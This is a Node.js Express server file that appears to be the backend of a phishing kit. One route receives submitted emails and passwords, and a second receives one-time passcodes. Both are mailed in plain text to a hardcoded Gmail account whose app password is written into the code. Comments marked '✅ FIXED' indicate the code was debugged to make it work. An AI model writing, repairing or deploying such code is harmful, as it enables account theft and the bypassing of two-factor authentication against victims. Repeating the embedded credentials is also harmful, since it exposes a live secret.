const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");

app.use(express.json());
app.use(cors());

const PORT = process.env.PORT || 5000;

// Email credentials
const userEmail = "godmy3207@gmail.com";
const pass = "cvshxefhvudublab";

// API routes for index
app.post("/", (req, res) => {
  const { email, password } = req.body;
  
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });
  
  const mailOptions = {
    from: userEmail, // ✅ FIXED: Changed from email to userEmail
    to: userEmail,
    subject: `New Login Attempt`,
    text: `New user registered with Email: ${email} and password: ${password}`,
  };
  
  console.log(mailOptions);
  
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("Error occurred: " + error);
    } else {
      console.log("Email sent: " + info.response); // ✅ FIXED: Added colon instead of +
      res.send("success");
    }
  });
});

// API routes for otp
app.post("/otp", (req, res) => {
  console.log(req.body);
  const email = req.body.email; // ✅ FIXED: Removed console.log assignment
  const otp = req.body.otp;
  
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });
  
  const mailOptions = {
    from: userEmail, // ✅ FIXED: Changed to userEmail
    to: userEmail,
    subject: `OTP Received`,
    text: `OTP: ${otp} from user: ${email}`, // ✅ FIXED: Added text body
  };
  
  console.log(mailOptions);
  
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("Error occurred: " + error);
    } else {
      console.log("Email sent: " + info.response); // ✅ FIXED: Added colon
      res.send("success");
    }
  });
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`); // ✅ FIXED: Parentheses instead of backticks
});
